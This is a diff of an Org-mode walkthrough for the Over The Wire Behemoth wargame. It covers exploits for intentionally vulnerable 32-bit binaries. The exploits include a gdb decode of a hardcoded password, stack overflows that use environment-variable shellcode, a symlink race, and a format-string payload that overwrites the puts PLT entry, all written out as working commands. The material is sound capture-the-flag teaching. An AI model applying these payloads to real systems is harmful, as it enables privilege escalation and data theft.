@@ -1,15 +1,15 @@
-#+setupfile: ../setup.org
 #+TITLE: Over The Wire: Behemoth
-#+OPTIONS: toc:t
+#+DATE: May 16, 2022
+#+OPTIONS: toc:t num:nil
 
 * About this Document
 This document is a light-weight walk-through for solving the wargame
 named Behemoth which is provided by "Over The Wire". It consists of
-elementary security vulnerabilities on the 32bit x86 platform. You
+elementary security vulnerabilities on the 32 bit x86 platform. You
 can find the wargame [[https://overthewire.org/wargames/behemoth/][here]].
 
 Each level consists of one vulnerable program, that can be exploited
-to escalate privileges the password for the next level.
+to escalate privileges and capture the password for the next level.
 
 The format of this document is to present the vulnerability followed
 by one possible exploit. No attempt is made to explain generic
@@ -28,11 +28,12 @@ and the other being =getenvaddr=.
 
 ** Shellcode
 Because we only care about getting the passwords by reading a file
-located in =/etc/behemoth_pass/=, we don't care about spawning a
-shell. Therefore, our shellcode executes =/bin/cat= to print the
-contents of =/etc/behemoth_pass/behemothX= to standard out. The =X= in
-that path is replaced by the appropriate level, which makes this
-shellcode easily reusable for any level that calls for shellcode.
+located in =/etc/behemoth_pass/=, we don't care about spawning a shell
+(unless we're forced to for some reason). Therefore, our shellcode
+executes =/bin/cat= to print the contents of
+=/etc/behemoth_pass/behemothX= to standard out. The =X= at the end of
+the path is replaced by the appropriate level, which makes this
+shellcode easily reusable for any level that calls for it.
 
 *** =shellcode.asm=
 #+NAME: shellcode.asm
@@ -78,8 +79,8 @@ $ nasm -o shellcode -f bin shellcode.asm
 ** Environment Variables
 The environment variable =EGG= will be used to store shellcode. In
 order to get the address of our environment variable, we'll use
-=getenvaddr.c=. This code is ripped off from Jon Erikson's book
-"Hacking: The Art of Exploitation".
+=getenvaddr.c=. This code is taken from Jon Erikson's book "Hacking:
+The Art of Exploitation".
 
 *** =getenvaddr.c=
 #+NAME: getenvaddr.c
@@ -107,12 +108,15 @@ $ gcc -m32 -o getenvaddr getenvaddr.c
 * Level 0
 
 ** The Vulnerability
-The user given password is checked against a hardcoded string. This
-string is the password that causes the program to continue it's normal
-execution and spawns a shell.
+When the program is ran, the user is prompted for a password. The user
+given password is checked against a hardcoded string. This string is
+the password that causes the program to continue it's normal execution
+and spawns a shell. Line 48 is where a shell owned by behemoth1 would
+be spwaned if the correct password is given.
 
-Line 33 is where the string comparsion happens. You can see our input
-string is stored in =$ebp-0x5d= and the correct password is stored in
+Line 33 is where the string comparsion happens between the given
+password and the correct password. You can see our input string is
+stored in =$ebp-0x5d= and the correct password is stored in
 =$ebp-1c=. However, it is "encrypted". The function for encrypting and
 decrypting the password is =memfrob=.
 
@@ -176,7 +180,7 @@ decrypting the password is =memfrob=.
  8048675:       c3                      ret
 #+END_EXAMPLE
 
-** The Exploitation
+** The Exploit
 We can open up a debugger and either set a breakpoint at =strcmp= and
 look at the decrypted string or we can call =memfrob= on the string
 and look at it. We'll do the latter because it's a little more
@@ -196,8 +200,23 @@ Breakpoint 1 at 0x8048400
 Starting program: /behemoth/behemoth0
 
 Breakpoint 1, 0xf7e5b7d0 in printf () from /lib32/libc.so.6
+#+END_EXAMPLE
+
+At this point, the the password string is initialized at =$ebp-0x1c=
+but it's encrypted. We can see the encrypted string by doing,
+
+#+BEGIN_EXAMPLE
 (gdb) x/s $ebp-0x1c
 0xffffd6ac:     "OK^GSYBEX^Y"
+#+END_EXAMPLE
+
+Now let's decrypted it by calling =memfrob=. If you look at what's
+happening, you'll see that =memfrob= takes 2 arguments; the first
+being a pointer to a string and the second being the length of the
+string. Therefore, in order to call =memfrob=, we need the length of
+=$ebp-0x1c=. We can get this by calling =strlen=.
+
+#+BEGIN_EXAMPLE
 (gdb) call strlen($ebp-0x1c)
 $1 = 11
 (gdb) call memfrob($ebp-0x1c, 11)
@@ -210,6 +229,11 @@ A debugging session is active.
         Inferior 1 [process 16747] will be killed.
 
 Quit anyway? (y or n) y
+#+END_EXAMPLE
+
+Now that we have what we think is the password, we can test it.
+
+#+BEGIN_EXAMPLE
 $ /behemoth/behemoth0
 Password: eatmyshorts
 Access granted..
@@ -217,6 +241,9 @@ $ whoami
 behemoth1
 $
 #+END_EXAMPLE
+
+Now we have the correct privilages to read
+=/etc/behemoth_pass/behemoth1=.
 
 * Level 1
 
@@ -247,14 +274,21 @@ the return address of =main=.
  804847d:       c3                      ret
 #+END_EXAMPLE
 
-** Exploitation
-We'll put our shell in =$EGG= and overwrite the return address from
+** The Exploit
+We'll put our shellcode in =$EGG= and overwrite the return address from
 =main= to point to =$EGG=.
 
 #+BEGIN_EXAMPLE
 $ export EGG=$(cat shellcode)
 $ ./getenvaddr EGG /behemoth/behemoth1
 ffffda2d
+#+END_EXAMPLE
+
+Because the x86 architecture is little endian, we have to put the
+bytes in the correct order. The low-order byte goes first and the
+high-order byte last.
+
+#+BEGIN_EXAMPLE
 $ printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
 Password: Authentication failure.
 Sorry.
@@ -262,10 +296,20 @@ XXXXXXXXXX
 $
 #+END_EXAMPLE
 
+The shellcode displays the contents of
+=/etc/behemoth_pass/behemoth2=, which I have censored here.
+
 * Level 2
 
 ** The Vulnerability
-A race condition.
+This awkward program has a vulnerable race condition. It tries to
+create a file who's filename is the PID of the process creating
+it. Then the program sleeps for 33.3 minutes. When it wakes up, it
+prints out the contents of the file it created.
+
+Therefore, if we can replace the created file with a symbolic link
+that points to =/etc/behemoth_pass/behemoth3=, then we can possibly
+captured the password.
 
 #+BEGIN_EXAMPLE -n 1
 0804856b <main>:
@@ -345,39 +389,145 @@ A race condition.
  8048653:       c3                      ret
 #+END_EXAMPLE
 
-** Exploitation
+** The Exploit
 
-*** Part 1
+Because the process is running as behemoth3, we need to ensure the
+process has permission to write to the directories and files we
+need. To accomplish this, we'll make a new directory and give it 777
+permissions. Then we'll make a file called =pass.txt= and give it the
+same permissions.
 
 #+BEGIN_EXAMPLE
 $ mkdir w
-$ chmod 777 w
-$ cd w/
-$ /behemoth/behemoth2 # While this is sleeping, run part 2
-nieteidiel
-$
+$ chmod 777
+$ cd w
+$ touch pass.txt
+$ chmod 777 pass.txt
 #+END_EXAMPLE
 
-*** Part 2
+This hack will take 33.3 minutes to complete. Because we don't want to
+sit here watching for a password to pop up, we'll run the process in
+the background and pipe the output to =pass.txt=. After we start the
+process, we'll know the PID and hence know the filename we need to
+overwrite with a symbolic link.
+
 #+BEGIN_EXAMPLE
-$ ln -sf /etc/behemoth_pass/behemoth2 10868 # Replace with PID
+$ behemoth/behemoth2 > pass.txt &
+[1] 29355
+$ ln -sf /etc/behemoth_pass/behemoth3 29355
+#+END_EXAMPLE
+
+We can run the following shell script snippet to sound the bell when the
+process has ended.
+
+#+BEGIN_EXAMPLE
+$ while (2>&1 kill -0 29355 | grep permitted > /dev/null); do
+> echo "Process still running..."
+> sleep 5
+> done; \
+> echo -ne '\007'; \ # Ring the bell
+> cat pass.txt
 #+END_EXAMPLE
 
 * Level 3
 ** The Vulnerability
+This level has a format string vulnerability. The user is prompted for
+input and that input is passed directly to =printf=. Therefore, a user
+can inject formatting syntax that =printf= understands.
 
-** Exploitation
+This can be used to overwrite parts of memory using the =%n=
+specificer; which implies we can overwrite a return address, parts of
+the =.plt= section or something else we choose.
+
+Looking at the dissasembly of =main=, we see =puts= is called at
+address =0x80484cc=.
 
 #+BEGIN_EXAMPLE
-$ printf '\xac\x97\x04\x08\xae\x97\x04\x08%%.56877x%%1$n%%.8650x%%2$n' | /behemoth/behemoth3
+0804847b <main>:
+ 804847b:       55                      push   ebp
+ 804847c:       89 e5                   mov    ebp,esp
+ 804847e:       81 ec c8 00 00 00       sub    esp,0xc8
+ 8048484:       68 60 85 04 08          push   0x8048560
+ 8048489:       e8 a2 fe ff ff          call   8048330 <printf@plt>
+ 804848e:       83 c4 04                add    esp,0x4
+ 8048491:       a1 c0 97 04 08          mov    eax,ds:0x80497c0
+ 8048496:       50                      push   eax
+ 8048497:       68 c8 00 00 00          push   0xc8
+ 804849c:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
+ 80484a2:       50                      push   eax
+ 80484a3:       e8 98 fe ff ff          call   8048340 <fgets@plt>
+ 80484a8:       83 c4 0c                add    esp,0xc
+ 80484ab:       68 74 85 04 08          push   0x8048574
+ 80484b0:       e8 7b fe ff ff          call   8048330 <printf@plt>
+ 80484b5:       83 c4 04                add    esp,0x4
+ 80484b8:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
+ 80484be:       50                      push   eax
+ 80484bf:       e8 6c fe ff ff          call   8048330 <printf@plt>
+ 80484c4:       83 c4 04                add    esp,0x4
+ 80484c7:       68 7e 85 04 08          push   0x804857e
+ 80484cc:       e8 7f fe ff ff          call   8048350 <puts@plt>
+ 80484d1:       83 c4 04                add    esp,0x4
+ 80484d4:       b8 00 00 00 00          mov    eax,0x0
+ 80484d9:       c9                      leave  
+ 80484da:       c3                      ret
+ #+END_EXAMPLE
+
+Because the program is calling =puts= from a dynamically loaded
+library, it needs to know how to find the address where =puts=
+resides. This information is supplied by the =.plt= section.
+
+ #+BEGIN_EXAMPLE
+ 08048350 <puts@plt>:
+ 8048350:       ff 25 ac 97 04 08       jmp    DWORD PTR ds:0x80497ac
+ 8048356:       68 10 00 00 00          push   0x10
+ 804835b:       e9 c0 ff ff ff          jmp    8048320 <.plt>
+ #+END_EXAMPLE
+
+ We can see from the above diassembly that the pointer to =puts= is
+ =0x80497ac=.
+ 
+** The Exploit
+
+Let's first prepare our shellcode.
+
+#+BEGIN_EXAMPLE
+$ export EGG=$(cat shellcode)
+$ ./getenvaddr EGG /behemoth/behemoth3
+ffffde2d
+#+END_EXAMPLE
+
+From the =.plt= section, we know the pointer for =puts= is
+=0x80497ac=. We'll overwrite the value in two steps. First overwriting
+2 bytes at =0x80497ac=. Then overwriting 2 bytes at =0x80497ae=. The
+order matters. The =%n= specifier writes 4 bytes (an unsigned int) and
+we don't want to overwrite the upper 2 bytes of our address when
+writing the lower two bytes.
+
+Our string for =printf= will conceptually consist of two parts. The
+first is ="\xac\x97\x04\x08\xae\x97\x04\x08"= which will act as
+pointers for =%n=. The second part will have this structure
+="%c%1$n%c%2$n"=. We just have to figure out how many chars to print
+so that =%n= will write the correct value.
+
+If we use the strings above as they are, the lower 2 bytes would be
+written with 0x09 and the upper 2 bytes would be 0x0a. We need the
+lower 2 bytes to be 0xde2d. Therefore, we need to write 56869 (0xde25)
+more characters and then 8658 (0x21d2) more characters for the last 2
+bytes.
+
+The final result looks like this:
+
+#+BEGIN_EXAMPLE
+$ printf '\xac\x97\x04\x08\xae\x97\x04\x08%%56869c%%1$n%%8658c%%2$n' | /behemoth/behemoth3
+
+XXXXXXXXXX
 #+END_EXAMPLE
 
 * Level 4
 
 ** The Vulnerability
 
-
-** Exploitation
+** The Exploit
 
 #+BEGIN_SRC
 #include <stdio.h>
@@ -406,7 +556,7 @@ int main() {
 * Level 5
 ** The Vulnerability
 
-** Exploitation
+** The Exploit
 
 #+BEGIN_EXAMPLE
 behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$ nc -u -l -p 1337 > pass &
@@ -426,7 +576,7 @@ behemoth5@behemoth:/tmp/tmp.qYjggWFTSv$
 
 ** The Vulnerability
 
-** Exploitation
+** The Exploit
 
 #+NAME: shellcode6.asm
 #+BEGIN_SRC asm -n 1
@@ -468,7 +618,7 @@ $
 
 ** The Vulnerability
 
-** Exploitation
+** The Exploit
 
 #+BEGIN_EXAMPLE
 $ $(python3 -c 'print("A" * 528, end="")'; printf "\xe0\xd4\xff\xff") $(cat shellcode.bin)
